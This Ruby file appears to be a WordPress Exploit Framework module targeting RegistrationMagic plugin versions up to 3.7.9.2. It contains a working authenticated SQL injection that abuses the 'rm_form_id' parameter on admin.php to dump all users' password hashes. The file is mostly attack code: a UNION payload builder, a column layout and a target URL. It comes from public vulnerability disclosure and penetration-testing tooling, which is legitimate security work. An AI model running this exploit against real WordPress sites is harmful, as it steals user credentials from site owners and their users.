# frozen_string_literal: true

class Wpxf::Auxiliary::RegistrationMagicHashDump < Wpxf::Module
  include Wpxf::WordPress::HashDump

  def initialize
    super

    update_info(
      name: 'RegistrationMagic - Custom Registration Forms <= 3.7.9.2 Authenticated Hash Dump',
      desc: %(
        RegistrationMagic - Custom Registration Forms <= 3.7.9.2 suffers from an
        SQL injection vulnerability which is exploitable by registered users with the
        required privileges to manage the plugin.

        This module utilises the vulnerability to dump the hashed passwords
        of all users in the database.
      ),
      author: [
        'rastating' # Disclosure + WPXF module
      ],
      references: [
        ['WPVDB', '8975'],
        ['URL', 'https://www.rastating.com/registrationmagic-custom-registration-forms-3-7-9-2-authenticated-sql-injection']
      ],
      date: 'Dec 10 2017'
    )
  end

  def check
    check_plugin_version_from_readme('custom-registration-form-builder-with-submission-manager', '3.7.9.3')
  end

  def requires_authentication
    true
  end

  def hashdump_request_params
    {
      'page'       => 'rm_field_manage',
      'rm_form_id' => "-#{Utility::Text.rand_numeric(2)} UNION #{hashdump_sql_statement}"
    }
  end

  def hashdump_custom_union_values
    values = Array.new(11)
    values[4] = 'concat(0x54,0x65,0x78,0x74,0x62,0x6f,0x78)'
    values
  end

  def hashdump_visible_field_index
    3
  end

  def hashdump_number_of_cols
    11
  end

  def vulnerable_url
    normalize_uri(wordpress_url_admin, 'admin.php')
  end
end
